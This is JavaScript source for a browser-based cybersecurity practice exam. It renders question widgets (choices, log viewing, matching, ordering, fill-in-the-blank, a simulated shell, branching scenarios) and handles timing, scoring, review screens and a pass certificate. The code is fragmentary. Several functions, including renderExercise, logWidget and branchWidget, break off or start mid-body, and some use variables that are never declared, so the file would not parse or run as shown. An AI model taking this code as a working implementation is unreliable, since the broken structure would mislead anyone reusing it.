function renderExercise(){
  S.phase='exam';
  if(S.timeLeft>0)startTimer();

  /* SCENARIO block (collapsible) */
  var sblk=el('div','blk scen');
  var sh=el('div','blk-h','<span aria-hidden="true">&#128203;</span> SCENARIO');

/* ---------- submit & feedback ---------- */
function submitExercise(ex){
  var r=res(ex.id);
  if(r.submitted)return;
  var w=S.widgets[ex.id];
  var frac=w.grade();
  var status=frac>=0.999?'correct':(frac>0?'partial':'wrong');
  var pts=Math.max(0,Math.round(10*frac)-(r.hintUsed?1:0));
  r.submitted=true;r.frac=frac;r.status=status;r.awarded=pts;
  r.dangerHit=!!(w.hit&&w.hit.danger);
  r.answerSummary=w.summary();
  w.lock();
  showFeedback(ex,r);
  var sub=$('submit-'+ex.id);if(sub)sub.disabled=true;
  var nx=$('next-'+ex.id);if(nx)nx.style.display='';
  renderHeader();
}
function feedbackHTML(ex,r){
  var cls=r.status==='correct'?'ok':(r.status==='partial'?'mid':'bad');
  var icon=r.status==='correct'?'&#10004;':(r.status==='partial'?'&#9650;':'&#10008;');
  var word=r.status==='correct'?'CORRECT':(r.status==='partial'?'PARTIALLY CORRECT':'INCORRECT');
  var h='<div class="fb '+cls+'"><div class="fb-h"><span aria-hidden="true">'+icon+'</span> '+word;
  h+='</div><div class="fb-b">';
  h+='<div><b>Correct answer:</b> '+r.answerSummary+'</div>';
  h+='<div style="margin-top:9px"><b>Why:</b> '+ptext(ex.explain)+'</div>';
  if(r.dangerHit)h+='<div style="margin-top:9px;color:#fca5a5"><b>&#9888; Dangerous command:</b> what you typed would have destroyed or changed evidence. On a live case that is a serious mistake — the safe, read-only capture was the answer.</div>';
  if(r.status!=='correct')h+='<div style="margin-top:9px"><b>What to study:</b> '+esc(ex.study)+'</div>';
  h+='<div class="ptline">Points for this exercise: <b>'+r.awarded+' / 10</b>'+(r.hintUsed?' (hint used: &minus;1)':'')+'</div>';
  if(ex.perspNote)h+='<div style="margin-top:9px;border-top:1px solid var(--line);padding-top:9px"><b>Two-sided view:</b> '+ptext(ex.perspNote)+'</div>';
  h+='</div></div>';
  return h;
}
function showFeedback(ex,r){
  var w=$('fbwrap-'+ex.id);if(!w)return;
  w.innerHTML=feedbackHTML(ex,r);
  var ok=r.status==='correct'||r.status==='partial';
  toast((ok?'\u2714 Submitted — ':'\u2718 Submitted — ')+r.awarded+'/10 pts');
}


/* ---------- widget factory ---------- */
function makeWidget(ex){
  switch(ex.type){
    case 'qcm':case 'multi':return optsWidget(ex);
    case 'logview':return logWidget(ex);
    case 'match':return matchWidget(ex);
    case 'order':return orderWidget(ex);
    case 'categorize':return catWidget(ex);
    case 'fill':return fillWidget(ex);
    case 'terminal':return termWidget(ex);
    case 'branch':return branchWidget(ex);
    default:return optsWidget(ex);
  }
}
function optRow(labelText,valIdx,dispPos,w,state){
  var b=el('button','opt'+(state.sel.indexOf(valIdx)>=0?' sel':''));
  b.type='button';
  b.dataset.val=valIdx;
  b.innerHTML='<span class="ol">'+letters(dispPos)+'.</span><span>'+ptext(labelText)+'</span>';
  b.setAttribute('role','checkbox');
  b.setAttribute('aria-checked',state.sel.indexOf(valIdx)>=0?'true':'false');
  b.addEventListener('click',function(){
    if(w.locked)return;
    var at=state.sel.indexOf(valIdx);
    if(w.ex.type==='multi'){
      if(at>=0)state.sel.splice(at,1);else{if(state.sel.length>=w.ex.correct.length){toast('You only need '+w.ex.correct.length+' answers — unselect one first');return;}state.sel.push(valIdx);}
    } else {state.sel=[valIdx];}
    Array.prototype.forEach.call(w.root.querySelectorAll('.opt'),function(o){
      var v=parseInt(o.dataset.val,10);
      o.classList.toggle('sel',state.sel.indexOf(v)>=0);
      o.setAttribute('aria-checked',state.sel.indexOf(v)>=0?'true':'false');
    });
  });
  return b;
}
function optsWidget(ex){
  var w={locked:false,root:null,order:[],state:{sel:[]},ex:ex};
  var r=res(ex.id);
  w.order=shuffle(ex.options.map(function(o,i){return i;}));
  w.mount=function(){
    w.root=el('div','opts');
    if(r&&r.picked&&r.picked.length){w.state.sel=r.picked.slice();}
    w.order.forEach(function(oi,pos){
      var b=optRow(ex.options[oi],oi,pos,w,w.state);
      w.root.appendChild(b);
    });
    if(r&&r.submitted)w.lock();
    return w.root;
  };
  w.grade=function(){
    r.picked=w.state.sel.slice();
    var hits=0,misses=0;
    w.state.sel.forEach(function(i){if(ex.correct.indexOf(i)>=0)hits++;else misses++;});
    var k=ex.correct.length;
    var frac=Math.max(0,(hits-misses)/k);
    return frac>=0.999?1:frac;
  };
  w.summary=function(){
    var good=ex.correct.map(function(i){return esc(ex.options[i]);}).join(' <b>and</b> ');
    return good;
  };
  w.lock=function(){
    w.locked=true;
    if(w.root){
      w.root.classList.add('opts-locked');
      Array.prototype.forEach.call(w.root.querySelectorAll('.opt'),function(b,pos){
        b.disabled=true;
        var oi=w.order[pos];
        if(ex.correct.indexOf(oi)>=0)b.classList.add('right');
        else if(w.state.sel.indexOf(oi)>=0)b.classList.add('wrongp');
      });
    }
  };
  return w;
}
/* ---------- log view ---------- */
function logWidget(ex){
  var w={locked:false,root:null,ex:ex};
  var r=res(ex.id);
  var ans=ex.answer;
  w.state={sel:(r&&r.picked!==undefined&&r.picked!==null)?r.picked:(ans.kind==='lineclick'?-1:[]),f:''};
  w.mount=function(){

    inp.value=w.state.f;

    var cnt=el('div','logcount','');
    box.appendChild(fl);

      Array.prototype.forEach.call(box.querySelectorAll('.logline'),function(n){n.remove();});
      var shown=0;
      ex.log.lines.forEach(function(ln,i){
        var t=ln.t;
        if(w.state.f&&t.toLowerCase().indexOf(w.state.f.toLowerCase())<0)return;
        shown++;

        b.type='button';

        b.innerHTML='<span class="lv-'+(ln.cls||'info')+'">'+esc(t)+'</span>';
        if(ans.kind==='lineclick'){
          b.addEventListener('click',function(){
            if(w.locked)return;
            w.state.sel=i;
            Array.prototype.forEach.call(box.querySelectorAll('.logline'),function(o){o.classList.remove('picked');});
            b.classList.add('picked');
          });
        }
        box.appendChild(b);
      });
      cnt.textContent='Showing '+shown+' of '+ex.log.lines.length+' lines';
    };
    inp.addEventListener('input',function(){w.state.f=inp.value;render();});
    box.appendChild(cnt);
    render();
    w.root.appendChild(box);
    if(ans.kind!=='lineclick'){
      var ow=optsWidget({type:ans.kind,options:ans.options,correct:ans.correct,id:ex.id+'-sub'});
      /* reuse optsWidget against its own state; sync picked on grade */
      w.sub=ow;
      w.root.appendChild(ow.mount());
    }
    if(r&&r.submitted)w.lock();
    return w.root;
  };
  w.grade=function(){
    if(ans.kind==='lineclick'){
      r.picked=w.state.sel;
      return w.state.sel===ans.correctLine?1:0;
    }
    var f=w.sub.grade();
    r.picked=w.state.sel;
    r.subpicked=w.sub.state.sel.slice();
    return f;
  };
  w.summary=function(){
    if(ans.kind==='lineclick')return '<code>'+esc(ex.log.lines[ans.correctLine].t)+'</code>';
    return ans.correct.map(function(i){return esc(ans.options[i]);}).join(' <b>and</b> ');
  };
  w.lock=function(){
    w.locked=true;
    if(ans.kind!=='lineclick'&&w.sub){w.sub.lock();}
  };
  return w;
}
/* ---------- match ---------- */
function matchWidget(ex){
  var w={locked:false,root:null,ex:ex};
  var r=res(ex.id);
  var pairOf={}; /* leftIdx -> rightIdx */
  if(r&&r.pairs){ex.left.forEach(function(_,i){pairOf[i]=r.pairs[i];});}
  var colors=['p1','p2','p3','p4','p5'];
  w.rightOrder=shuffle(ex.right.map(function(o,i){return i;}));
  w.state={selLeft:-1};
  w.mount=function(){
    w.root=el('div','mcols');
    w.L=el('div','mcol');
    w.R=el('div','mcol');
    draw();
    w.root.appendChild(w.L);w.root.appendChild(w.R);
    if(r&&r.submitted)w.lock();
    return w.root;
  };
  function draw(){
    var L=w.L,R=w.R;
    L.innerHTML='';R.innerHTML='';
    L.appendChild(el('h5','','Left — items'));
    R.appendChild(el('h5','','Right — meanings (click to pair)'));
    ex.left.forEach(function(txt,i){
      var b=el('button','mitem'+(w.state.selLeft===i?' lsel':''));
      b.type='button';
      var pid=pairOf[i];
      b.innerHTML='<span>'+esc(txt)+'</span>'+(pid!==undefined&&pid!==null?'<span class="pl '+colors[i%colors.length]+'">'+letters(pid)+'</span>':'');
      b.addEventListener('click',function(){
        if(w.locked)return;
        w.state.selLeft=i;
        draw();
      });
      L.appendChild(b);
    });
    w.rightOrder.forEach(function(ri){
      var b=el('button','mitem');
      b.type='button';
      var usedBy=-1;
      ex.left.forEach(function(_,li){if(pairOf[li]===ri)usedBy=li;});
      b.innerHTML='<span class="ol">'+letters(ri)+'.</span><span>'+esc(ex.right[ri])+'</span>';
      if(usedBy>=0){var tag=el('span','pl '+colors[usedBy%colors.length],'&#10003;');b.appendChild(tag);}
      b.addEventListener('click',function(){
        if(w.locked)return;
        if(w.state.selLeft<0){toast('Pick an item on the left first');return;}
        if(usedBy>=0){pairOf[usedBy]=null;}
        pairOf[w.state.selLeft]=ri;
        w.state.selLeft=-1;
        draw();
      });
      R.appendChild(b);
    });
  }
  w.grade=function(){
    var rp={};ex.pairs.forEach(function(p){rp[p[0]]=p[1];});
    var good=0;
    ex.left.forEach(function(_,i){
      r.pairs=r.pairs||{};
      r.pairs[i]=pairOf[i];
      if(pairOf[i]!==undefined&&pairOf[i]!==null&&pairOf[i]===rp[i])good++;
    });
    return good/ex.left.length;
  };
  w.summary=function(){
    return ex.pairs.map(function(p){return esc(ex.left[p[0]])+' \u2192 '+esc(ex.right[p[1]]);}).join('<br>');
  };
  w.lock=function(){w.locked=true;};
  return w;
}
/* ---------- order / rank ---------- */
function orderWidget(ex){
  var w={locked:false,root:null,ex:ex};
  var r=res(ex.id);
  w.cur=(r&&r.arr)?r.arr.slice():shuffle(ex.items.map(function(o,i){return i;}));
  w.state={sel:-1};
  w.mount=function(){
    w.root=el('div');
    var ol=el('ul','ordlist'+(ex.mode==='rank'?' rankmode':''));
    w.ol=ol;
    w.root.appendChild(ol);
    w.root.appendChild(el('p','dim',(ex.mode==='rank'?'Drag items or use the arrows to rank them — best first. ':'Put the steps in the right order — top to bottom. ')+'Click two rows to swap them.'));
    draw();
    if(r&&r.submitted)w.lock();
    return w.root;
  };
  function draw(){
    var ol=w.ol;
    ol.innerHTML='';
    w.cur.forEach(function(oi,pos){
      var li=el('li','orditem'+(w.state.sel===pos?' sel':''));
      li.setAttribute('draggable',!w.locked?'true':'false');
      li.innerHTML='<span class="ordnum">'+(pos+1)+'</span><span>'+esc(ex.items[oi])+'</span>';
      var btns=el('div','ordbtns');
      var up=el('button','mini','\u2191');up.type='button';up.setAttribute('aria-label','Move up');
      up.addEventListener('click',function(e){e.stopPropagation();if(w.locked)return;swap(pos,pos-1);});
      var dn=el('button','mini','\u2193');dn.type='button';dn.setAttribute('aria-label','Move down');
      dn.addEventListener('click',function(e){e.stopPropagation();if(w.locked)return;swap(pos,pos+1);});
      btns.appendChild(up);btns.appendChild(dn);
      li.appendChild(btns);
      li.addEventListener('click',function(){
        if(w.locked)return;
        if(w.state.sel<0){w.state.sel=pos;}
        else if(w.state.sel===pos){w.state.sel=-1;}
        else{swap(w.state.sel,pos);w.state.sel=-1;}
        draw();
      });
      li.addEventListener('dragstart',function(e){w.dragFrom=pos;e.dataTransfer.setData('text/plain',String(pos));});
      li.addEventListener('dragover',function(e){e.preventDefault();});
      li.addEventListener('drop',function(e){e.preventDefault();if(w.locked)return;var from=w.dragFrom;swap(from,pos);w.state.sel=-1;draw();});
      ol.appendChild(li);
    });
  }
  function swap(a,b){if(b<0||b>=w.cur.length||a===b)return;var t=w.cur[a];w.cur[a]=w.cur[b];w.cur[b]=t;draw();}
  w.grade=function(){
    r.arr=w.cur.slice();
    var good=0;
    w.cur.forEach(function(oi,pos){if(oi===pos)good++;});
    return good/ex.items.length;
  };
  w.summary=function(){
    return ex.items.map(function(t,i){return '<b>'+(i+1)+'.</b> '+esc(t);}).join('<br>');
  };
  w.lock=function(){w.locked=true;if(w.ol)Array.prototype.forEach.call(w.ol.querySelectorAll('.orditem'),function(n){n.setAttribute('draggable','false');});};
  return w;
}
/* ---------- categorize (drag & drop) ---------- */
function catWidget(ex){
  var w={locked:false,root:null,ex:ex};
  var r=res(ex.id);
  w.place={}; /* itemIdx -> zoneIdx */
  if(r&&r.place){ex.items.forEach(function(it,i){if(r.place[i]!==undefined&&r.place[i]!==null)w.place[i]=r.place[i];});}
  w.bankOrder=shuffle(ex.items.map(function(o,i){return i;}));
  w.state={sel:-1};
  w.mount=function(){
    w.root=el('div');
    w.root.appendChild(el('p','dim','Drag each card into a box — or click a card, then click a box.'));
    w.zw=el('div','zones');
    w.bw=el('div','bank');
    w.root.appendChild(w.zw);w.root.appendChild(el('h5','dim','Item bank (drag from here)'));
    w.root.appendChild(w.bw);
    draw();
    if(r&&r.submitted)w.lock();
    return w.root;
  };
  function card(txt,i,cls){
    var b=el('button',cls+(w.state.sel===i?' sel':''));
    b.type='button';
    b.setAttribute('aria-pressed',w.state.sel===i?'true':'false');
    b.setAttribute('draggable',!w.locked?'true':'false');
    b.dataset.i=i;
    b.innerHTML='<span class="idx">'+letters(i)+'</span><span>'+esc(txt)+'</span>';
    b.addEventListener('click',function(e){
      e.stopPropagation();
      if(w.locked)return;
      w.state.sel=(w.state.sel===i?-1:i);
      draw();
    });
    b.addEventListener('dragstart',function(e){w.dragItem=i;try{e.dataTransfer.setData('text/plain',String(i));}catch(x){}});
    b.addEventListener('dragover',function(e){e.preventDefault();});
    b.addEventListener('drop',function(e){e.preventDefault();e.stopPropagation();});
    return b;
  }
  function draw(){
    w.zw.innerHTML='';w.bw.innerHTML='';
    ex.zones.forEach(function(z,zi){
      var zd=el('div','zone');
      zd.dataset.z=zi;
      zd.setAttribute('tabindex','0');zd.setAttribute('role','button');
      zd.setAttribute('aria-label','Drop zone: '+z.name+'. With an item selected, press Enter to place it here.');
      zd.appendChild(el('h4','',esc(z.name)));
      if(z.desc)zd.appendChild(el('div','zdesc',esc(z.desc)));
      var inz=[];
      w.bankOrder.forEach(function(i){if(w.place[i]===zi)inz.push(i);});
      inz.forEach(function(i){zd.appendChild(card(ex.items[i].t,i,'zitem'));});
      var placeHere=function(){
        if(w.locked)return;
        if(w.state.sel>=0){w.place[w.state.sel]=zi;w.state.sel=-1;draw();}
      };
      zd.addEventListener('click',placeHere);
      zd.addEventListener('keydown',function(e){if(e.key==='Enter'||e.key===' '){e.preventDefault();placeHere();}});
      zd.addEventListener('dragover',function(e){e.preventDefault();zd.classList.add('over');});
      zd.addEventListener('dragleave',function(){zd.classList.remove('over');});
      zd.addEventListener('drop',function(e){
        e.preventDefault();zd.classList.remove('over');
        if(w.locked)return;
        var i=(w.dragItem!==undefined)?w.dragItem:parseInt(e.dataTransfer.getData('text/plain'),10);
        if(!isNaN(i)){w.place[i]=zi;w.state.sel=-1;draw();}
      });
      w.zw.appendChild(zd);
    });
    w.bw.setAttribute('tabindex','0');w.bw.setAttribute('role','button');
    w.bw.setAttribute('aria-label','Item bank. With an item selected, press Enter to return it here.');
    var backToBank=function(){
      if(w.locked)return;
      if(w.state.sel>=0){delete w.place[w.state.sel];w.state.sel=-1;draw();}
    };
    w.bw.addEventListener('click',backToBank);
    w.bw.addEventListener('keydown',function(e){if(e.key==='Enter'||e.key===' '){e.preventDefault();backToBank();}});
    w.bw.addEventListener('dragover',function(e){e.preventDefault();});
    w.bw.addEventListener('drop',function(e){
      e.preventDefault();
      if(w.locked)return;
      var i=(w.dragItem!==undefined)?w.dragItem:parseInt(e.dataTransfer.getData('text/plain'),10);
      if(!isNaN(i)){delete w.place[i];w.state.sel=-1;draw();}
    });
    w.bankOrder.forEach(function(i){
      if(w.place[i]===undefined||w.place[i]===null)w.bw.appendChild(card(ex.items[i].t,i,'bankitem'));
    });
  }
  w.grade=function(){
    r.place={};
    var good=0;
    ex.items.forEach(function(it,i){
      r.place[i]=w.place[i];
      if(w.place[i]===it.z)good++;
    });
    return good/ex.items.length;
  };
  w.summary=function(){
    return ex.zones.map(function(z,zi){
      var its=ex.items.map(function(it,i){return (ex.items[i].z===zi)?esc(it.t):null;}).filter(Boolean);
      return '<b>'+esc(z.name)+':</b> '+(its.length?its.join('; '):'—');
    }).join('<br>');
  };
  w.lock=function(){w.locked=true;};
  return w;
}
/* ---------- fill in the blank ---------- */
function fillWidget(ex){
  var w={locked:false,root:null,ex:ex};
  var r=res(ex.id);
  var n=ex.correct.length;
  w.fills=[];
  if(r&&r.fills){for(var i=0;i<n;i++)w.fills[i]=(r.fills[i]===undefined||r.fills[i]===null)?null:r.fills[i];}
  else{for(var j=0;j<n;j++)w.fills[j]=null;}
  w.bankOrder=shuffle(ex.bank.map(function(o,i){return i;}));
  w.state={slot:-1};
  w.mount=function(){
    w.root=el('div');
    w.txt=el('div','filltext');
    w.root.appendChild(w.txt);
    w.root.appendChild(el('h5','dim','Word bank — click a word (then a gap, if you want to choose)'));
    w.bw=el('div','bank');
    w.root.appendChild(w.bw);
    draw();
    if(r&&r.submitted)w.lock();
    return w.root;
  };
  function draw(){
    var parts=ex.text.split(/\{\{\d\}\}/);
    var h='';
    for(var i=0;i<parts.length;i++){
      h+=esc(parts[i]);
      if(i<n){
        var v=w.fills[i];
        h+='<span class="slot'+(v!==null?' filled':'')+(w.state.slot===i?' sel':'')+'" data-slot="'+i+'" role="button" tabindex="0">'+(v===null?'&nbsp;':esc(v))+'</span>';
      }
    }
    w.txt.innerHTML=h;
    Array.prototype.forEach.call(w.txt.querySelectorAll('.slot'),function(s){
      var i=parseInt(s.getAttribute('data-slot'),10);
      var act=function(){
        if(w.locked)return;
        if(w.fills[i]!==null){w.fills[i]=null;draw();return;}
        w.state.slot=i;draw();
      };
      s.addEventListener('click',act);
      s.addEventListener('keydown',function(e){if(e.key==='Enter'||e.key===' '){e.preventDefault();act();}});
    });
    w.bw.innerHTML='';
    w.bankOrder.forEach(function(bi){
      var used=w.fills.indexOf(ex.bank[bi]);
      var b=el('button','wchip'+(used>=0?' used':'')+(w.state.sel===bi?' sel':''));
      b.type='button';
      b.textContent=ex.bank[bi];
      b.addEventListener('click',function(){
        if(w.locked||used>=0)return;
        var slot=(w.state.slot>=0&&w.fills[w.state.slot]===null)?w.state.slot:w.fills.indexOf(null);
        if(slot<0){toast('All gaps are filled — click a gap to clear it first');return;}
        w.fills[slot]=ex.bank[bi];
        w.state.slot=-1;
        draw();
      });
      w.bw.appendChild(b);
    });
  }
  w.grade=function(){
    r.fills=w.fills.slice();
    var good=0;
    for(var i=0;i<n;i++){if(w.fills[i]===ex.correct[i])good++;}
    return good/n;
  };
  w.summary=function(){
    var parts=ex.text.split(/\{\{\d\}\}/);
    var h='';
    for(var i=0;i<parts.length;i++){h+=esc(parts[i]);if(i<n)h+='<code>'+esc(ex.correct[i])+'</code>';}
    return h;
  };
  w.lock=function(){w.locked=true;};
  return w;
}


/* ---------- terminal ---------- */
function termWidget(ex){
  var w={locked:false,root:null,ex:ex};
  var r=S.work[ex.id];
  w.state={lastCmd:(r&&r.lastCmd)?r.lastCmd:null,hist:(r&&r.hist)?r.hist.slice():[]};
  w.mount=function(){
    w.root=el('div');
    if(ex.timeLimit){
      var tl=el('div','tag red','\u23F1 Reduced timer for this terminal task: '+ex.timeLimit+' s once you type the first character');
      w.root.appendChild(tl);
      w.tlLeft=ex.timeLimit;
    }
    if(ex.sample){
      var sx=el('div','syntax');
      sx.innerHTML='<h6>SYNTAX REMINDER</h6>'+
        '<pre>'+esc(ex.sample.shape)+'</pre>'+
        '<pre>'+esc(ex.sample.meaning)+'</pre>'+
        '<pre>Example (different target): '+esc(ex.sample.example)+'</pre>'+
        '<h6 style="margin-top:8px">EXPECTED OUTPUT SHAPE</h6>'+
        '<pre>'+esc(ex.sample.output)+'</pre>';
      w.root.appendChild(sx);
    }
    var t=el('div','term');
    var tt=el('div','termtitle','<span>\u25A0</span> '+esc(ex.os)+' — simulated shell (nothing real is executed)');
    var out=el('div','termout');
    out.innerHTML='<span class="lv-sys">'+esc(ex.banner||'Simulation shell. Type the command and press Enter. Then press Submit answer.')+'</span>\n';
    (w.state.hist||[]).forEach(function(h){out.innerHTML+=esc(h)+'\n';});
    var inw=el('div','termin');
    var pr=el('span','pr',esc(ex.prompt)+' ');
    var inp=el('input');inp.type='text';inp.spellcheck=false;
    inp.setAttribute('aria-label','Type the command');
    if(w.state.lastCmd)inp.value=w.state.lastCmd;
    inw.appendChild(pr);inw.appendChild(inp);
    t.appendChild(tt);t.appendChild(out);t.appendChild(inw);
    w.root.appendChild(t);
    w.out=out;w.inp=inp;
    var run=function(){
      var c=inp.value;
      if(!c.trim())return;
      w.state.lastCmd=c;
      if(r)r.lastCmd=c;
      if(ex.timeLimit&&!w.tlId){
        w.tlId=setInterval(function(){
          if(S.paused)return;
          w.tlLeft--;
          if(w.tlLeft<=0&&!w.locked){
            clearInterval(w.tlId);
            out.innerHTML+='\n<span class="lv-crit">TIME UP for this task — submit now with what you have.</span>';
            out.scrollTop=out.scrollHeight;
          }
        },1000);
      }
      w.exec(c,out,inp);
    };
    inp.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();run();}});
    if(r&&r.submitted){w.lock();w.inp.disabled=true;}
    return w.root;
  };
  w.exec=function(c,out,inp){
    var nc=normCmd(c);
    var resp=null,ok=false;
    for(var i=0;i<ex.accepted.length;i++){
      var a=ex.accepted[i];
      if(new RegExp(a.re,'i').test(nc)){resp=a;break;}
    }
    w.state.hist.push((ex.prompt+' '+c));
    if(resp){
      w.state.hist.push(resp.out);
      w.lastKind=resp.ok?'ok':(resp.danger?'danger':'near');
    } else {
      w.state.hist.push('bash: '+c.trim().split(' ')[0]+': command not found (simulation recognises only the commands this task needs)');
      w.lastKind='nf';
    }
    out.innerHTML='';
    w.state.hist.forEach(function(h){
      var cls=h.indexOf(ex.prompt+' ')===0?'lv-sys':(h.indexOf('TIME UP')===0?'lv-crit':'');
      out.innerHTML+='<span class="'+cls+'">'+esc(h)+'</span>\n';
    });
    out.scrollTop=out.scrollHeight;
    inp.value='';
  };
  w.grade=function(){
    if(!w.state.lastCmd)return 0;
    var nc=normCmd(w.state.lastCmd);
    var best=0;
    for(var i=0;i<ex.accepted.length;i++){
      var a=ex.accepted[i];
      if(new RegExp(a.re,'i').test(nc)){
        best=a.ok?1:0;
        w.hit=a;
        break;
      }
    }
    r.lastCmd=w.state.lastCmd;r.hist=w.state.hist.slice();
    return best;
  };
  w.summary=function(){
    return '<div class="copyblk"><code>'+esc(ex.canonical)+'</code></div>';
  };
  w.lock=function(){
    w.locked=true;
    if(w.inp)w.inp.disabled=true;
    if(w.tlId){clearInterval(w.tlId);w.tlId=null;}
  };
  return w;
}
/* ---------- branching ---------- */
function branchWidget(ex){

  w.step=(r&&r.step)?r.step:0;

    sblk.appendChild(sb);
    w.root.appendChild(sblk);
    var q=el('div','blk quest');
    q.appendChild(el('div','blk-h','<span aria-hidden="true">&#10067;</span> QUESTION'));
    q.appendChild(el('div','blk-b',esc(stp.question)));
    w.root.appendChild(q);
    var a=el('div','blk answ');
    a.appendChild(el('div','blk-h','<span aria-hidden="true">&#9997;</span> YOUR ANSWER'));
    var ab=el('div','blk-b');
    var ow=optsWidget({type:'qcm',id:ex.id+'-s'+w.step,options:stp.options,correct:[stp.correct]});
    ab.appendChild(ow.mount());
    if(w.picked>=0){
      ow.state.sel=[w.picked];
      Array.prototype.forEach.call(ow.root.querySelectorAll('.opt'),function(o){
        var v=parseInt(o.dataset.val,10);
        o.classList.toggle('sel',v===w.picked);
        o.setAttribute('aria-checked',v===w.picked?'true':'false');
      });
    }
    var br=el('div','btnrow');
    var go=el('button','mainbtn',w.step===ex.steps.length-1?'Confirm final decision':'Confirm step '+(w.step+1));
    go.type='button';
    go.addEventListener('click',function(){
      if(w.locked||w.done)return;
      if(ow.state.sel.length===0){toast('Choose an option first');return;}
      w.picked=ow.state.sel[0];
      r.bPicked=w.picked;
      if(w.picked===stp.correct){
        w.goodSteps++;r.goodSteps=w.goodSteps;
        w.step++;r.step=w.step;
        if(w.step<ex.steps.length){
          draw();
          appendOutcome('ok','&#10004; GOOD MOVE',ptext(stp.ok),'');
        } else {
          w.done=true;r.bDone=true;w.locked=true;
          appendOutcome('ok','&#10004; GOOD MOVE',ptext(stp.ok),'<div style="margin-top:9px"><b>All steps complete.</b> Press "Submit answer" above to record this exercise.</div>');
        }
      } else {
        w.done=true;r.bDone=true;w.locked=true;
        appendOutcome('bad','&#10008; THE BRANCH BREAKS HERE',ptext(stp.bad),'<div style="margin-top:9px"><b>What to study:</b> '+esc(ex.study)+'</div><div style="margin-top:6px">Press "Submit answer" above to record this exercise — or Skip to retry it from the review screen.</div>');
      }
      window.scrollTo(0,document.body.scrollHeight);
    });
    br.appendChild(go);
    ab.appendChild(br);
    a.appendChild(ab);
    w.root.appendChild(a);
  }
  function appendOutcome(kind,title,bodyHtml,extraHtml){
    var b=el('div','fb '+kind);
    b.innerHTML='<div class="fb-h"><span aria-hidden="true">'+title+'</span> '+(kind==='ok'?'GOOD MOVE':'THE BRANCH BREAKS HERE')+'</div>'+
      '<div class="fb-b">'+bodyHtml+extraHtml+'</div>';
    w.root.appendChild(b);
  }
  w.grade=function(){
    return Math.min(1,w.goodSteps/ex.steps.length);
  };
  w.summary=function(){
    return ex.steps.map(function(s,i){return '<b>Step '+(i+1)+':</b> '+esc(s.options[s.correct]);}).join('<br>');
  };
  w.lock=function(){w.locked=true;};
  return w;
}

/* ---------- exam flow ---------- */
function startExam(){
  S.order=shuffle(D.exercises.map(function(e,i){return i;}));
  S.idx=0;S.widgets={};S.work={};S.fromReview=false;S.reported=false;
  S.timeLeft=D.timerSec;S.paused=false;
  renderExercise();
  startTimer();
}
function skipCurrent(ex){
  var r=res(ex.id);
  if(r.submitted)return;
  r.status='skipped';
  toast('Skipped — find it again on the "Review skipped" screen before you finish');
  if(S.fromReview){S.fromReview=false;renderReview();}
  else nextExercise();
}
function nextExercise(){
  if(S.fromReview){S.fromReview=false;renderReview();return;}
  if(S.idx<S.order.length-1){S.idx++;renderExercise();return;}
  var pool=skippedList();
  if(pool.length){renderReview();}
  else finishExam(false);
}
function renderReview(){
  S.phase='review';
  var st=$('stage');st.innerHTML='';
  var sc=el('div','screen');
  var c=el('div','card');
  c.appendChild(el('h3','','\u26A0 Review skipped exercises'));
  c.appendChild(el('p','dim','The clock keeps running. You can return to a skipped exercise as many times as you want until the timer ends — if the timer ends while you are here, the exam finishes automatically with what was answered. If you finish with skipped exercises still unanswered, they are excluded from the score: they count as neither correct nor wrong, and their points are removed from the total.'));
  skippedList().forEach(function(ex){
    var it=el('div','revitem');
    it.innerHTML='<div class="ri-b"><h5>'+esc(ex.id+' — '+(ex.title||ex.theme))+'</h5><span class="dim">'+esc(ex.summary)+'</span></div>';
    var b=el('button','mainbtn','Answer now');
    b.addEventListener('click',function(){
      S.idx=S.order.indexOf(D.exercises.indexOf(ex));
      S.fromReview=true;
      renderExercise();
    });
    it.appendChild(b);
    c.appendChild(it);
  });
  var fin=el('button','mainbtn','Finish and see results \u2192');
  fin.addEventListener('click',function(){finishExam(false);});
  var w=el('div','btnrow');w.style.justifyContent='center';w.style.margin='16px 0';
  w.appendChild(fin);
  sc.appendChild(c);sc.appendChild(w);
  st.appendChild(sc);
  renderHeader();
  window.scrollTo(0,0);
}
/* ---------- results ---------- */
function computeResult(){
  var answered=answeredList();
  var correct=0,wrong=0;
  answered.forEach(function(ex){
    var st=S.work[ex.id].status;
    if(st==='correct')correct++;else wrong++;
  });
  var skipped=skippedList();
  var untouched=S.order.length-answered.length-skipped.length;
  var score=earnedPoints();
  var total=possiblePoints();
  var pct=total>0?Math.round(score/total*100):0;
  return {answered:answered,correct:correct,wrong:wrong,skipped:skipped,untouched:untouched,score:score,total:total,pct:pct,passed:pct>=D.meta.passMark};
}
function reportScore(correct,total){
  var percent=total>0?Math.round((correct/total)*100):0;
  try{
    parent.postMessage({
      type:'CYBERPULSE_SCORE',
      topicId:D.meta.topicId,
      batch:D.meta.batch,
      score:correct,
      total:total,
      percent:percent,
      passed:percent>=D.meta.passMark
    },location.origin);
  }catch(e){
    /* Opened directly rather than inside the site. Nothing to report to. */
  }
}
function finishExam(auto){
  stopTimer();
  S.paused=false;
  var o=$('pauseov');if(o)o.remove();
  if($('stage'))$('stage').style.visibility='';
  S.phase='results';
  var R=computeResult();
  renderResults(R,auto);
}
function renderResults(R,auto){
  var st=$('stage');st.innerHTML='';
  var sc=el('div','screen');
  var head=el('div','card');
  head.appendChild(el('h3','',esc(D.meta.title)+' — final result'+(auto?' (time is up)':'')));
  var top=el('div','res-top');
  var big=el('div','scorebig','0%');
  big.id='bigscore';
  big.style.color=R.passed?'var(--good)':'var(--bad)';
  top.appendChild(big);
  top.appendChild(el('div','mut','Score <b>'+R.score+' / '+R.total+' pts</b><br>computed over answered exercises only'));
  head.appendChild(top);
  sc.appendChild(head);
  var panel;
  if(R.passed){
    panel=el('div','passpanel');
    panel.innerHTML='<h2>&#127942; PASS — '+(R.pct>=100?'Flawless':'Certificate earned')+'</h2>'+
      '<p class="certline">This certifies that <b>'+esc(S.learner||'the learner')+'</b> passed the '+esc(D.meta.title)+' practice exam</p>'+
      '<p class="certline">Score: <b>'+R.pct+'%</b> · Pass mark: '+D.meta.passMark+'% · Tier: <b style="color:'+D.severity.color+'">'+esc(D.severity.label)+'</b> · '+new Date().toLocaleDateString()+'</p>'+
      '<p class="certline" style="margin-top:8px">You showed command of '+esc(D.techniqueId)+' — '+esc(D.techniqueName)+' at this tier. Keep the report below as your revision sheet.</p>';
  } else {
    panel=el('div','failpanel');
    panel.innerHTML='<h2>&#10008; NOT PASSED — you must retake it</h2>'+
      '<p class="certline">You scored <b>'+R.pct+'%</b>; the pass mark is '+D.meta.passMark+'%.</p>'+
